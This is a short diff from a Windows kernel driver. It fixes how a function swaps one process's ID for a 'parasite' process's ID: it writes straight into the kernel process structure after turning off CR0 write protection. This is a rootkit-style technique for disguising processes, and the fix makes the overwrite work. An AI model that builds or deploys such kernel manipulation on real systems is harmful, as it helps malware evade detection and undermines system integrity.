@@ -616,10 +616,10 @@ VOID processPretentProcedure(
     PEPROCESS dirtyPE = NULL;
     PsLookupProcessByProcessId((HANDLE)dirtyPID, &dirtyPE);
     ULONG64 dirtyPIDAddress = (ULONG64)dirtyPE + uniqueProcessIDOffset;
-    ULONG64 tempParasitePid = parasitePID;
+    ULONG64 tempParasitePid = (ULONG64)parasitePID;
     ULONG64 oldCR0 = 0x0; 
     __asm__WRbreak(&oldCR0); 
-    memcpy((PVOID)dirtyPIDAddress, (PVOID)tempParasitePid, sizeof(HANDLE));
+    memcpy((PVOID)dirtyPIDAddress, (PVOID)&tempParasitePid, sizeof(HANDLE));
     __asm__WRrestore(oldCR0);
     if (*headPPL == NULL)
     {
